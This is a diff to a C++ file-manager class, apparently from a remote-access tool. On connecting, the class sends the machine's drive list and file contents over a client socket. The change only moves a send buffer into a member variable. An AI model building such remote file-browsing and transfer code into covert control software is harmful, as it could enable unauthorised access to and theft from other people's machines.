@@ -18,10 +18,12 @@ CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
 	m_nTransferMode = TRANSFER_MODE_NORMAL;
 	// 发送驱动器列表, 开始进行文件管理，建立新线程
 	SendDriveList();
+	m_pSendBuffer = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
 }
 
 CFileManager::~CFileManager()
 {
+	LocalFree(m_pSendBuffer);
 	m_UploadList.clear();
 }
 
@@ -468,25 +470,25 @@ UINT CFileManager::SendFileData(LPBYTE lpBuffer)
 	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
 	DWORD	nNumberOfBytesRead = 0;
 
-	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
+	//LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
 	// Token,  大小，偏移，文件名，数据
-	lpPacket[0] = TOKEN_FILE_DATA;
-	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
-	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
+	m_pSendBuffer[0] = TOKEN_FILE_DATA;
+	memcpy(m_pSendBuffer + 1, pFileSize, sizeof(FILESIZE));
+	ReadFile(hFile, m_pSendBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
 	CloseHandle(hFile);
 
 
 	if (nNumberOfBytesRead > 0)
 	{
 		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
-		nRet = Send(lpPacket, nPacketSize);
+		nRet = Send(m_pSendBuffer, nPacketSize);
 	}
 	else
 	{
 		UploadNext();
 	}
 
-	LocalFree(lpPacket);
+	//LocalFree(lpPacket);
 
 	return nRet;
 }
@@ -774,6 +776,7 @@ void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 	dwOffsetLow += dwBytesWrite;
 	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
 	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
+
 	Send(bToken, sizeof(bToken));
 }
 void CFileManager::SetTransferMode(LPBYTE lpBuffer)
